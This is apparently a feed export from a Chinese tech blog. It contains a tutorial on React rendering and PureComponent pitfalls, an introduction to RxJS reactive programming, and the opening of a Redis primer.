class Row extends Component &#123;  render () &#123;    const &#123;item, style&#125; = this.props;    return (      &lt;tr style=&#123;style&#125;&gt;        &lt;td&gt;&#123;item.id&#125;&lt;/td&gt;      &lt;/tr&gt;    )  &#125;&#125;  class Table extends PureComponent &#123;  render() &#123;    const &#123;list&#125; = this.props;    const itemStyle = &#123;      color: &#x27;red&#x27;    &#125;    return (      &lt;table&gt;          &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125;      &lt;/table&gt;    )  &#125;&#125;  class App extends Component &#123;  state = &#123;    list: Array(10000).fill(0).map((val, index) =&gt; (&#123;id: index&#125;))  &#125;    handleClick = () =&gt; &#123;    this.setState(&#123;      list: [...this.state.list, 1234567] // 增加一個元素    &#125;)  &#125;    render() &#123;    const &#123;list&#125; = this.state;    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;change state!&lt;/button&gt;        &lt;Table list=&#123;list&#125; /&gt;      &lt;/div&gt;    );  &#125;&#125;

這時候 Table 的 PureComponent 優化已經沒有用了，因為 list 已經變了，所以會觸發 render function。要繼續優化的話，比較常用的手段是把 Row 變成 PureComponent，這樣就可以確保相同的 Row 不會再次渲染。
class Row extends PureComponent &#123;  render () &#123;    const &#123;item, style&#125; = this.props;    return (      &lt;tr style=&#123;style&#125;&gt;        &lt;td&gt;&#123;item.id&#125;&lt;/td&gt;      &lt;/tr&gt;    )  &#125;&#125;  class Table extends PureComponent &#123;  render() &#123;    const &#123;list&#125; = this.props;    const itemStyle = &#123;      color: &#x27;red&#x27;    &#125;    return (      &lt;table&gt;          &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125;      &lt;/table&gt;    )  &#125;&#125;

請問：把 Row 從 Component 換成 PureComponent 之後，如果我們再做一次同樣的操作，也就是按下change state按鈕改變 list，這時候會提升效率嗎？
A. 會，在這情況下 PureComponent 會比 Component 有效率B. 不會，兩者差不多C. 不會，在這情況下 Component 會比 PureComponent 有效率
React 的 render 機制在公布答案之前，先幫大家簡單複習一下 React 是如何把你的畫面渲染出來的。
首先，大家都知道你在render這個 function 裡面可以回傳你想渲染的東西，例如說：
class Content extends React.Component &#123;  render () &#123;    return &lt;div&gt;Content&lt;/div&gt;  &#125;&#125;

要注意的是這邊 return 的東西不會直接就放到 DOM 上面去，而是會先經過一層 virtual DOM。其實你可以簡單把這個 virtual DOM 想成 JavaScript 的物件，例如說上面 Content render 出來的結果可能是：
&#123;  tagName: &#x27;div&#x27;,  children: &#x27;Content&#x27;&#125;

最後一步則是 React 進行 virtual DOM diff，把上次的跟這次的做比較，並且把變動的部分更新到真的 DOM 上面去。
簡單來說呢，就是在 React Component 以及 DOM 之間新增了一層 virtual DOM，先把你要渲染的東西轉成 virtual DOM，再把需要更新的東西 update 到真的 DOM 上面去。
如此一來，就能夠減少觸碰到真的 DOM 的次數並且提升性能。
舉個例子，假設我們實作一個非常簡單的，按一個按鈕之後就會改變 state 的小範例：
class Content extends React.Component &#123;  render () &#123;    return &lt;div&gt;&#123;this.props.text&#125;&lt;/div&gt;  &#125;&#125;  class App extends React.Component &#123;  state = &#123;    text: &#x27;hello&#x27;  &#125;  handleClick = () =&gt; &#123;    this.setState(&#123;      text: &#x27;world&#x27;    &#125;)  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt;        &lt;Content text=&#123;this.state.text&#125; /&gt;      &lt;/div&gt;    );  &#125;&#125;

在程式剛開始執行時，渲染的順序是這樣的：

呼叫 App 的 render
呼叫 Content 的 render
拿到 virtual DOM
跟上次的 virtual DOM 做比較
把改變的地方應用到真的 DOM

這時候的 virtual DOM 整體應該會長得像這樣：
&#123;  tagName: &#x27;div&#x27;,  children: [    &#123;      tagName: &#x27;button&#x27;,      children: &#x27;setState&#x27;    &#125;, &#123;      tagName: &#x27;div&#x27;,      children: &#x27;hello&#x27;    &#125;  ]&#125;

當你按下按鈕，改變 state 了以後，執行順序都跟剛剛一樣：

呼叫 App 的 render
呼叫 Content 的 render
拿到 virtual DOM

這時候拿到的 virtual DOM 應該會長得像這樣：
&#123;  tagName: &#x27;div&#x27;,  children: [    &#123;      tagName: &#x27;button&#x27;,      children: &#x27;setState&#x27;    &#125;, &#123;      tagName: &#x27;div&#x27;,      children: &#x27;world&#x27; // 只有這邊變了    &#125;  ]&#125;

而 React 的 virtual DOM diff 演算法，就會發現只有一個地方改變，然後把那邊的文字替換掉，其他部分都不會動到。
其實官方文件把這一段寫得很好：

When you use React, at a single point in time you can think of the render() function as creating a tree of React elements. On the next state or props update, that render() function will return a different tree of React elements. React then needs to figure out how to efficiently update the UI to match the most recent tree.

大意就是你可以想像成 render function 會回傳一個 React elements 的 tree，然後 React 會把這次的 tree 跟上次的做比較，並且找出如何有效率地把這差異 update 到 UI 上面去。
所以說呢，如果你要成功更新畫面，你必須經過兩個步驟：

render function
virtual DOM diff

因此，要優化效能的話你有兩個方向，那就是：

不要觸發 render function
保持 virtual DOM 的一致

我們先從後者開始吧！
提升 React 效能：保持 virtual DOM 的一致因為有了 virtual DOM 這一層的守護，通常你不必太擔心 React 的效能。
像是我們開頭問答的第一題：
class Content extends React.Component &#123;  render () &#123;    console.log(&#x27;render content!&#x27;);    return &lt;div&gt;Content&lt;/div&gt;  &#125;&#125;  class App extends React.Component &#123;  handleClick = () =&gt; &#123;    this.setState(&#123;      a: 1    &#125;)  &#125;  render() &#123;    console.log(&#x27;render App!&#x27;);    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt;        &lt;Content /&gt;      &lt;/div&gt;    );  &#125;&#125;  ReactDOM.render(  &lt;App /&gt;,  document.getElementById(&#x27;container&#x27;));

你每次按下按鈕之後，由於 App 的 state 改變了，所以會先觸發 App 的 render function，而因為裡面有回傳&lt;Content /&gt;，所以也會觸發 Content 的 render function。
因此你每按一次按鈕，這兩個 component 的 render function 就會個別被呼叫一次。所以答案是C. render App! 以及 render content!（兩者的 render function 都被執行到）
可是儘管如此，真的 DOM 不會有任何變化。因為在 virtual DOM diff 的時候，React 會發現你這次跟上次的 virtual DOM 長得一模一樣（因為沒有東西改變嘛），就不會對 DOM 做任何操作。
如果能盡量維持 virtual DOM 的結構相似的話，可以減少一些不必要的操作，在這點上其實可以做的優化還很多，可以參考官方文件，裡面寫的很詳細。
提升 React 效能：不要觸發 render function雖然不必太過擔心，但是 virtual DOM diff 也是需要執行時間的。雖然說速度很快，但再快也比不上完全不呼叫來的快，你說是吧。
對於這種「我們已經明確知道不該有變化」的情形，我們連 render 都不該呼叫，因為沒必要嘛，再怎麼呼叫都是一樣的結果。如果 render 沒有被呼叫的話，連 virtual DOM diff 都不需要執行，又提升了一些性能。
你應該有聽過shouldComponentUpdate這個 function，就是來做這件事的。如果你在這個 function 中回傳 false，就不會重新呼叫 render function。
class Content extends React.Component &#123;  shouldComponentUpdate () &#123;    return false;  &#125;  render () &#123;    console.log(&#x27;render content!&#x27;);    return &lt;div&gt;Content&lt;/div&gt;  &#125;&#125;  class App extends React.Component &#123;  handleClick = () =&gt; &#123;    this.setState(&#123;      a: 1    &#125;)  &#125;  render() &#123;    console.log(&#x27;render App!&#x27;);    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt;        &lt;Content /&gt;      &lt;/div&gt;    );  &#125;&#125;

加上去之後，你會發現無論你按多次按鈕，Content 的 render function 都不會被觸發。
但是這個東西請小心使用，一個不注意你就會碰到 state 跟 UI 搭不上的情形，例如說 state 明明變成 world，可是 UI 顯示的還是 Hello：
class Content extends React.Component &#123;  shouldComponentUpdate()&#123;    return false;  &#125;    render () &#123;    return &lt;div&gt;&#123;this.props.text&#125;&lt;/div&gt;  &#125;&#125;  class App extends React.Component &#123;  state = &#123;    text: &#x27;hello&#x27;  &#125;  handleClick = () =&gt; &#123;    this.setState(&#123;      text: &#x27;world&#x27;    &#125;)  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt;        &lt;Content text=&#123;this.state.text&#125; /&gt;      &lt;/div&gt;    );  &#125;&#125;

在上面的例子中，按下按鈕之後 state 確實變成world，但是因為 Content 的shouldComponentUpdate永遠都回傳 false，所以不會再次觸發 render，就看不到對應的新的 state 的畫面了。
不過這有點極端，因為通常不會永遠都回傳 false，除非你真的確定這個 component 完全不需要 re-render。
比起這個，有一個更合理的判斷基準是：

如果每一個 props 跟 state 都沒有變，那就回傳 false

class Content extends React.Component &#123;  shouldComponentUpdate(nextProps, nextState)&#123;    return !shallowEqual(this.props, nextProps) || !shallowEqual(this.state, nextState);  &#125;    render () &#123;    return &lt;div&gt;&#123;this.props.text&#125;&lt;/div&gt;  &#125;&#125;

假設this.props是：
&#123;  text: &#x27;hello&#x27;&#125;

而nextProps是：
&#123;  text: &#x27;world&#x27;&#125;

那在比較的時候就會發現props.text變了，就可以順理成章的呼叫 render function。還有另外一點是這邊用shallowEqual來比較前後的差異，而不是用deepEqual。
這是出於效能上的考量。別忘了，你要執行這樣的比較也是會吃資源的，尤其是在你的 object 很深很深的時候，要比較的東西可就多了，因此我們會傾向用shallowEqual，只要比較一層即可。
另外，前面有提到PureComponent這個東西，其實就是 React 提供的另外一種元件，差別就是在於它自動幫你加上上面那一段的比較。如果你想看原始碼的話，在這邊：
if (type.prototype &amp;&amp; type.prototype.isPureReactComponent) &#123;  return (    !shallowEqual(oldProps, newProps) || !shallowEqual(oldState, newState)  );&#125;

講到這邊，就可以來公佈第二題的解答了，答案是：A. 會，在這情況下 PureComponent 會比 Component 有效率，因為繼承了 PureComponent 之後，只要 props 跟 state 沒變，就不會執行 render function，也不會執行 virtual DOM diff，節省了許多開銷。
shallowEqual 與 Immutable data structures你剛開始在學 React 的時候，可能會被告誡說如果要更改資料，不能夠這樣寫：
// 不能這樣const newObject = this.state.objnewObject.id = 2;this.setState(&#123;  obj: newObject&#125;)  // 也不能這樣const arr = this.state.arr;arr.push(123);this.setState(&#123;  list: arr&#125;)

而是應該要這樣：
this.setState(&#123;  obj: &#123;    ...this.state.obj,    id: 2  &#125;&#125;)  this.setState(&#123;  list: [...this.state.arr, 123]&#125;)

但你知道為什麼嗎？
這個就跟我們上面講到的東西有關了。如同上面所述，其實使用PureComponent是一件很正常的事情，因為 state 跟 props 如果沒變的話，本來就不該觸發 render function。
而剛剛也提過PureComponent會幫你shallowEqual state 跟 props，決定要不要呼叫 render function。
在這種情況下，如果你用了一開始講的那種寫法，就會產生問題，例如說：
const newObject = this.state.objnewObject.id = 2;this.setState(&#123;  obj: newObject&#125;)

在上面的程式碼中，其實this.state.obj跟newObject還是指向同一個物件，指向同一塊記憶體，所以當我們在做shallowEqual的時候，就會判斷出這兩個東西是相等的，就不會執行 render function 了。
在這時候，我們就需要 Immutable data，Immutable 翻成中文就是永遠不變的，意思就是：「當一個資料被創建之後，就永遠不會變了」。那如果我需要更改資料的話怎麼辦呢？你就只能創一個新的。
const obj = &#123;  id: 1,  text: &#x27;hello&#x27;&#125;  obj.text = &#x27;world&#x27; // 這樣不行，因為你改變了 obj 這個物件  // 你必須要像這樣創造一個新的物件const newObj = &#123;  ...obj,  text: &#x27;world&#x27;&#125;

有了 Immutable 的概念之後，shallowEqual就不會出錯了，因為如果我們有新的資料，就可以保證它是一個新的 object，這也是為什麼我們在用setState的時候總是要產生一個新的物件，而不是直接對現有的做操作。
// 沒有 Immutable 的概念前 const props = &#123;  id: 1,  list: [1, 2, 3]&#125;  const list = props.list;list.push(4)nextProps = &#123;  ...props,  list&#125;  props.list === nextProps.list // true  // 有了 Immutable 的概念後const props = &#123;  id: 1,  list: [1, 2, 3]&#125;  const nextProps = &#123;  ...props,  list: [...props.list, 4]&#125;  props.list === nextProps.list // false

這邊還有一個要注意的地方，那就是 spread operator 只會複製第一層的資料而已，它並不是 deep clone：
const test = &#123;  a: 1,  nest: &#123;    title: &#x27;hello&#x27;  &#125;&#125;  const copy = &#123;...test&#125;  copy.nest === test.nest // true

所以當你的 state 是比較複雜的結構時，要改變資料就會變得比較麻煩一點，因為你必須要對每一層都做差不多的事情，避免直接去改到你要改的物件：
// 沒有 Immutable 的概念前 const props = &#123;  title: &#x27;123&#x27;,  list: [    &#123;      id: 1,      name: &#x27;hello&#x27;    &#125;, &#123;      id: 2,      name: &#x27;world&#x27;    &#125;  ]&#125;  const list = props.list;list[1].name = &#x27;world2&#x27;; // 直接改nextProps = &#123;  ...props,  list&#125;  props.list === nextProps.list // trueprops.list[1] === nextProps.list[1] // true  // 有了 Immutable 的概念後const props = &#123;  title: &#x27;123&#x27;,  list: [    &#123;      id: 1,      name: &#x27;hello&#x27;    &#125;, &#123;      id: 2,      name: &#x27;world&#x27;    &#125;  ]&#125;  // 要注意這邊只是 shallow copy 而已// list[0] === props.list[0] =&gt; trueconst list = [...props.list.slice(0, 1)]const data = props.list[1];  const nextProps = &#123;  ...props,  list: [...list, &#123;    ...data, // 再做一次 spread oprator    name: &#x27;world2&#x27;  &#125;]&#125;  props.list === nextProps.list // falseprops.list[0] === nextProps.list[0] // trueprops.list[1] === nextProps.list[1] // false

若你的 state 結構很多層，那就會變得非常非常難改，這時候你有三個選擇：

避免這麼多層的 state，盡量壓平（可參考normalizr）
找一個會幫你做 Immutable 的 library，例如說 Facebook 的 Immutable.js
直接用 deep clone 把資料全部複製下來，之後你愛怎麼改就怎麼改（不推薦）

註：感謝網友 KanYueh Chen 的指正，讓我補上上面這一段。
PureComponent 的陷阱當我們遵守 Immutable 的規則之後，理所當然的就會想把所有的 Component 都設成 PureComponent，因為 PureComponent 的預設很合理嘛，資料沒變的話就不呼叫 render function，可以節省很多不必要的比較。
那讓我們回頭來看開場小測驗的最後一題：
class Row extends PureComponent &#123;  render () &#123;    const &#123;item, style&#125; = this.props;    return (      &lt;tr style=&#123;style&#125;&gt;        &lt;td&gt;&#123;item.id&#125;&lt;/td&gt;      &lt;/tr&gt;    )  &#125;&#125;  class Table extends PureComponent &#123;  render() &#123;    const &#123;list&#125; = this.props;    const itemStyle = &#123;      color: &#x27;red&#x27;    &#125;    return (      &lt;table&gt;          &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125;      &lt;/table&gt;    )  &#125;&#125;

我們把Row變成了 PureComponent，所以只要 state 跟 props 沒變，就不會 re-render，所以答案應該要是A. 會，在這情況下 PureComponent 會比 Component 有效率？
錯，如果你把程式碼看更清楚一點，你會發現答案其實是C. 不會，在這情況下 Component 會比 PureComponent 有效率。
你的前提是對的，「只要 state 跟 props 沒變，就不會 re-render，PureComponent 就會比 Component 更有效率」。但其實還有另外一句話也是對的：「如果你的 state 或 props 『永遠都會變』，那 PureComponent 並不會比較快」。
所以這兩種的使用時機差異在於：state 跟 props 到底常常會變還是不會變？
上述的例子中，陷阱在於itemStyle這個 props，我們每次 render 的時候都創建了一個新的物件，所以對 Row 來說，儘管 props.item 是一樣的，但是 props.style 卻是「每次都不一樣」。
如果你已經知道每次都會不一樣，那 PureComponent 這時候就無用武之地了，而且還更糟。為什麼？因為它幫你做了shallowEqual。
別忘記了，shallowEqual也是需要執行時間的。
已經知道 props 的比較每次都失敗的話，那不如不要比還會來的比較快，所以在這個情形下，Component 會比 PureComponent 有效率，因為不用做shallowEqual。
這就是我開頭提到的需要特別注意的部分。不要以為你把每個 Component 都換成 PureComponent 就天下太平，App 變超快，效能提升好幾倍。不去注意這些細節的話，就有可能把效能越弄越糟。
最後再強調一次，如果你已經預期到某個 component 的 props 或是 state 會「很頻繁變動」，那你根本不用換成 PureComponent，因為你實作之後反而會變得更慢。
總結在研究這些效能相關的問題時，我最推薦這篇：React, Inline Functions, and Performance，解開了很多我心中的疑惑以及帶給我很多新的想法。
例如說文末提到的 PureComponent 有時候反而會變慢，也是從這篇文章看來的，真心推薦大家抽空去看看。
前陣子跟同事一起把一個專案打掉重做，原本的共識是盡量用 PureComponent，直到我看到這篇文並且仔細思考了一下，發現如果你不知道背後的原理，還是不要輕易使用比較好。因此我就提議改成全部用 Component，等我們碰到效能問題要來優化時再慢慢調整。
最後附上一句我很喜歡的話，從React 巢狀 Component 效能優化這篇看來的（這篇也是在講最後提到的 PureComponent 的問題）：

雖然你知道可以優化，但不代表你應該優化。

參考資料：High Performance React: 3 New Tools to Speed Up Your Appsreactjs - Reconciliationreactjs- Optimizing PerformanceReact is Slow, React is Fast: Optimizing React Apps in PracticeEfficient React Components: A Guide to Optimizing React Performance
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>Reactive Programming 簡介與教學(以 RxJS 為例)</title>
    <url>/2016/05/28/reactive-programming-intro-by-rxjs/</url>
    <content><![CDATA[Rx 其實也出來一段時間了，前陣子看到一篇文章解釋得蠻好的，擷取重點並加入一些自己的心得範例供大家參考，畢竟 Rx 中文的介紹似乎少了點…
相信聽過 Rx 的讀者，應該也會耳聞 RxJS, RxJAVA, RxAndroid等等，因此被 Google 慣壞的我們一定會試著去搜尋一下 Rx 到底是什麼
然後在 Google Search Result page 的最下方會看到 MSDN 的 Reactive Extensions 和 ReactiveX 

好的看來就是我們要找的東西，但這好眼熟喔? 是每天在寫的React嗎？難道是相關的東西？!
定睛一看會發現… 恩，基本上沒什麼關係。
Reactive Extensions 是 Microsoft open source 推廣的一個lib
Reactive Extensions (Rx) is a library for composing asynchronous and event-based programs using observable sequences and LINQ-style query operators.
網站連結：rx網站連結：ReactiveX.io

ReactiveX is a combination of the best ideas from the Observer pattern, the Iterator pattern, and functional programming
ok, Observer pattern, Iterator patter, functional programming 都聽過，而這些串起來似乎就是傳說中的 Reactive Programming.
What is Reactive Programming?Reactive Programming 是一種以 asynchronous data streams 為中心思想出發的程式撰寫方式，比較常聽到的是 asynchronous event，像是 user click event, mouse hover event 等等，而這邊特別的則是 data 與 **stream**，顧名思義，Reactive Extensions 將 event 延伸為 data，並且注重在 stream （串流）上，也就是 **時間序列上的一連串資料事件**，Rx讓你將任何事情都變化為 data streams : variables, user inputs, properties, caches, data structures 等等皆可，透過 Observe 這些 data streams，並依據其造成的 side effects 進行對應的動作。
Stream:	 時間序列上的一連串資料事件以一個 click event 來說，在 user 點擊的動作發生後，會有一段時間觸發了幾個事件 (event stream)：value, error or completed signal

而在 Reactive Programming 的概念下，你可以把任何事情都看作 Stream，並且 Observe stream 中的變化，以下面一個例子來說：
假設我們想要印出一個包含 1 到 5 的 Array，一般我們會這樣做：
example 1
iterate1To5.jsvar source = [1,2,3,4,5];source.map((item) =&gt; &#123;  console.log(&quot;onNext: &quot;+item);&#125;)

然而，以Rx來說，任何事情都要 Observable，因此我們可以這樣做：
observe1To5.js// Creates an observable sequence of 5 integersvar source = Rx.Observable.range(1, 5);// catch every status and print out valuevar subscription = source.subscribe(    x =&gt; console.log(&#x27;onNext: &#x27; + x),      e =&gt; console.log(&#x27;onError: &#x27; + e.message),      () =&gt; console.log(&#x27;onCompleted&#x27;));
在上面的例子中，我們創建了一個 Observable 的整數陣列，並且透過 subscribe 的動作去 listening 這個陣列，當有我們設定的 event 觸發時，我們就會 observe 到，並採取對應動作，這基本上就是 Observer Design Pattern 做的事情
Why RxJS以 Javascript 來說，想要抓取這些事件，一般可以用 callback 或是 Promise 來達成，然而 Promise 主要設計於一次性的事件與單一回傳值，而 RxJS 除了包含 Promise 外，提供了更豐富的整合應用。




Single return value
Mutiple return values



Pull&#x2F;Synchronous&#x2F;Interactive
Object
Iterables (Array&#x2F;Set&#x2F;Map&#x2F;Object)


Push&#x2F;Asynchronous&#x2F;Reactive
Promise
Observable


還記得前面 ReactiveX 的定義嗎？ “combination of Observer pattern, Iterator pattern and functional programming” 
RxJS 結合 Array#extras 的優點，讓你能夠方便處理 Multiple return values
延伸上面的例子來說：
example 2
iteratorPattern.jsconst data = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;];const source = Rx.Observable                 .interval(500)                 .take(6)                 .map(i =&gt; data[i])const result = sourceresult.subscribe(x =&gt; console.log(x));
當你 subscribe 這個 Observale 的 data source 時，他能讓你 監聽 陣列中，每 500ms (interval) 取一個值 (map(i &#x3D;&gt; data[i])) 並取 6 次 (take(6))
再回到最早的 click event 來說，假若我們想要能夠抓取 single click 與 double click 的事件，用最原始的 javascript 可能會需要許多變數來紀錄狀態、時間等等，但透過 RxJS 提供的 library，你只需要短短四行 code 就可以達成：
完整範例
multiClickStream.jsvar multiClickStream = clickStream    .buffer(function() &#123; return clickStream.throttle(250); &#125;)    .map(function(list) &#123; return list.length; &#125;)    .filter(function(x) &#123; return x &gt;= 2; &#125;);

     
由上圖可以清楚看到，RxJS 幫你把 Stream 上的 event 依照你想要的時間做 整理，buffer 住觸發時間在 250ms 間的 click events，並且利用 map 函式抓出每個 event list 的長度，並進一步抓出長度大於 2 ，也就是 double click 的 event 出來。
接著你只需要 subscribe 你剛剛定義的 event stream，即可做出反應(reaction)
multiClickStream.jsmultiClickStream.subscribe(function (numclicks) &#123;    document.querySelector(&#x27;h2&#x27;).textContent = &#x27;&#x27;+numclicks+&#x27;x click&#x27;;&#125;);

More examples (Autocompletion service)以現在的 web app 來說，大量依賴 user 互動的效果與呈現，在不影響使用者體驗的前提下，多是用非同步的方式去抓取資料、渲染頁面等等，因此 Rx 系列的出現絕對是一個很大的助益。
最後讓我們再以一個例子來做結尾，利用 RxJS 與 Jquery 打造 Wikipedia Autocompletion Service。
完整範例(source: http://xgrommx.github.io/rx-book/why_rx.html)
Step 1var keyups = Rx.Observable.fromEvent(input, &#x27;keyup&#x27;)    .map(e =&gt; e.target.value)    .filter(text =&gt; text.length &gt; 2);/* Now throttle the input for 500ms */var throttled = keyups.throttle(500 /* ms */);/* Now get only distinct values, so we eliminate the arrows and other control characters */var distinct = throttled.distinctUntilChanged();


我們先利用 Rx.Observable.fromEvent 來 Create 一個 binding keyup event 的 Observalbe keyups object，並且針對每次事件發生時，回傳被綁定的元素其 value 值長度大於二的

接著設定 keyups 的 throttle 時間，將 500ms 內的input當做一次event去觸發

再來剔除掉不相干的控制輸入，只抓取 distinct 的 value


Step 2function searchWikipedia (term) &#123;    return $.ajax(&#123;        url: &#x27;http://en.wikipedia.org/w/api.php&#x27;,        dataType: &#x27;jsonp&#x27;,        data: &#123;            action: &#x27;opensearch&#x27;,            format: &#x27;json&#x27;,            search: term        &#125;    &#125;).promise();&#125;


簡單撰寫一個 ajax 來 fetch search api
這邊我們直接 return promise，RxJS 會幫你 wrap 起來變成 Obserbale，或是你也可以利用 Rx.Observable.fromPromise 來將原有的 Promise 改裝

Step 3var suggestions = distinct.flatMapLatest(searchWikipedia);


利用 flatMapLatest 將剛才的 Observable object distinct 與 searchWikipedia function 做結合，then we good to go! (先不管flatMapLatest是什麼，總之他會將 distinct 這個 Observable sequence內的元素丟給 searchWikipedia，並將回傳回來的資料再轉換成 Observable sequence，讓人可以 subscribe)

Step 4suggestions.subscribe(data =&gt; &#123;    var res = data[1];    $results.empty();    $.each(res, (_, value) =&gt; $(&#x27;&lt;li&gt;&#x27; + value + &#x27;&lt;/li&gt;&#x27;).appendTo($results));&#125;, error =&gt; &#123;    /* handle any errors */    $results.empty();    $(&#x27;&lt;li&gt;Error: &#x27; + error + &#x27;&lt;/li&gt;&#x27;).appendTo($results);&#125;);


接著就是 Subscribe 剛剛的 Observable sequence suggestions，並將 listen 到的資料 show 出來

就這麼簡單完成了一個 Autocompletion 的 service 了！
題外話先簡單介紹什麼是 flatMap 與 flatMapLatest，畢竟剛剛範例有用到，而實際上 RxJS 還有很多複雜的 function 可以應用，待之後我有時間再繼續專研吧！但有興趣的讀者可以在文章最下方的連結找到資源。
flatMap 會將 一個 Observable Sequence 的元素 映射到 另一個新的 Observable Sequence，並且subscribe 原先的 Observable Sequence 的人也都可以聽得到
簡單的例子如下：
flatMapconsole.clear();var source = Rx.Observable    .range(1, 2)    .flatMap(function (x) &#123;        return Rx.Observable.range(x, 2);        &#125;);var subscription = source.subscribe(    function (x) &#123;        console.log(&#x27;Next: &#x27; + x);    &#125;,    function (err) &#123;        console.log(&#x27;Error: &#x27; + err);       &#125;,    function () &#123;        console.log(&#x27;Completed&#x27;);       &#125;);   // Result: // =&gt; Next: 1 // =&gt; Next: 2  Rx.Observable.range(1, 2)// =&gt; Next: 2 // =&gt; Next: 3  Rx.Observable.range(2, 2)// =&gt; Completed    

See? 他會把 sequence 中的元素丟進 callback，並回傳 Observable sequence，你也可以丟入 Promise，就像範例中做的。
而 flatMapLatest 則是只會進行最後一次的 sequence，以剛剛的範例來說，最後subscribe的人接收到的會是最新的那個 Observable sequence 的結果！而不會每打一個字所搜尋的結果都一直累加顯示上去。
One more thing在我前面放的圖中，描繪 Click event 的 叫做 marble 圖，這邊有個網站可以讓你以視覺化互動的方式去操作這些 event，幫助你理解 Rx 當中的各個 function 之功用！非常推薦！！去玩玩吧！rxmarbles
總結Rx 真的是蠻有趣的東西，提供的lib又號稱毫無相依性，可以應用在各種framework上方，只是必須要懂得如何Think in Reactive Programming，否則這些lib的用法還真的是不好理解，這篇拋磚引玉簡單介紹一下，之後會再有更深入的研究！ 有什麼說明不對的地方也請見諒與指教！
參考資料

The introduction to Reactive Programming you’ve been missing (by @andrestaltz)
Rx-book
Reactive-Extensions RxJS
rxmarbles

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>Rx, RxJS</tag>
      </tags>
  </entry>
  <entry>
    <title>資料庫的好夥伴：Redis</title>
    <url>/2016/06/18/redis-introduction/</url>
    <content><![CDATA[前言Redis 是一個 in-memory 的 key-value database，因此常常被用在需要快取（Cache）一些資料的場合，可以減輕許多後端資料庫的壓力。這篇就來簡單介紹一下 Redis 提供哪些好用的東西，以及可以應用在什麼地方。
常用指令Redis 的官網列出了支援的每一條指令，我們先來看看最簡單的：
SET, GETredis&gt; SET mykey &quot;Hello&quot;redis&gt; GET mykey&quot;Hello&quot;
前面有提到說 Redis 是一個 key-value pair 的資料庫，因此最簡單的 SET 就是設定某個 key 的值是多少，要取出來的話就用 GET 就好。
INCR, DECRredis&gt; SET mykey &quot;10&quot;redis&gt; DECR mykey(integer) 9redis&gt; INCR mykey(integer) 10

顧名思義就是針對某個 key 加一或減一的意思，像是程式語言裡面的mykey++跟mykey--。還有 INCRBY 與 DECRBY，可以指定你要加減的數量是多少。
HSET, HGETredis&gt; HSET mydata name &quot;nick&quot;redis&gt; HSET mydata nickname &quot;nicknick&quot;redis&gt; HGET mydata name&quot;nick&quot;

H 就是 Hashmap 的意思，所以你可以存取一個 value 底下的 field，讓你可以更多元的使用，例如說你可以定義 key 的規則是：POST + 文章 id，裡面就可以存這篇文章的讚數、回覆數等等，就不用每一次都去 Database 裡面重新抓取。
SADD, SCARDredis&gt; SADD myset &quot;nick&quot;redis&gt; SADD myset &quot;peter&quot;redis&gt; SADD myset &quot;nick&quot;redis&gt; SCARD myset(integer) 2

SADD 的 S 就是 Set 的意思，這邊的 Set 指的是資料結構學過的那個 Set，裡面不會有重複的內容。
LPUSH, RPUSH, LSET, LRANGEredis&gt; LPUSH mylist &quot;a&quot;redis&gt; LPUSH mylist &quot;b&quot;redis&gt; RPUSH mylist &quot;c&quot;redis&gt; LRANGE mylist 0 -11) &quot;b&quot;2) &quot;a&quot;3) &quot;c&quot;redis&gt; LSET mylist 0 &quot;d&quot;redis&gt; LRANGE mylist 0 -11) &quot;d&quot;2) &quot;a&quot;3) &quot;c&quot;

這邊的資料結構是 List，你可以選擇從左邊或是右邊 push 值進去，對應到的指令就是 LPUSH 與 RPUSH，LSET 則是指定某個 index 的 value 是多少。  
LRANGE 可以印出指定範圍的值，支援-1這種形式，表示最後一個值。
實際應用Redis 好用的地方就在於速度很快，所以若是開發上碰到一些場合需要速度很快的話，你可以先考慮看看 Redis 是不是能夠幫助到你，以下就舉幾個我實際使用過的例子。  
短網址系統其實短網址的原理非常簡單，就是一個 hash 對應到一個網址，hash 是用隨機產生，幾碼或是要有什麼符號可以自己決定，接著就把這組對應關係存到資料庫裡面，別人 query 相應的 key 時，你就 redirect 到相應的網址去就好了。  
也因為是這種 key-value 的一對一關係，所以非常適合使用 Redis。如果你不用像是 Redis 這種的 key-value cache，就必須「每一次」都從 Database 去 query。若是資料量小還好，但資料量一變大的時候，時間一定會增加，資料庫的負荷也會增加，因此在資料庫跟邏輯層之間引進一層快取，我認為是很好的選擇。  
實作的過程也很簡單，  

使用者新增短網址，系統亂數產生 abc123 對應到 http://techbridge.cc
把 key&#x3D;abc123, value&#x3D;http://techbridge.cc 寫進資料庫
同上，但是是儲存在 Redis
當有使用者點擊：abc123 這個網址時，先去 Redis 查有沒有這個 key
有的話，redirect 到對應的網址
沒有的話，只好去資料庫查，查完之後記得寫一份到 Redis

若是你的資料有超級多筆，又不想花很多的錢準備一台記憶體很大的 Redis Server（資料庫是用硬碟儲存，Redis 是存在記憶體，以儲存成本來說，資料庫會便宜許多），你可以使用 Redis 的 Expire 這個功能。  
當你在儲存資料的時候，你可以新增一個 Expire time 的參數，當這個時間一到之後，這個 key 就會自動被清除。舉例來說，短網址的 expire 可以設定成 7 天，當某個網址 7 天內都沒有被任何使用者訪問的話，就會自動被刪除。  
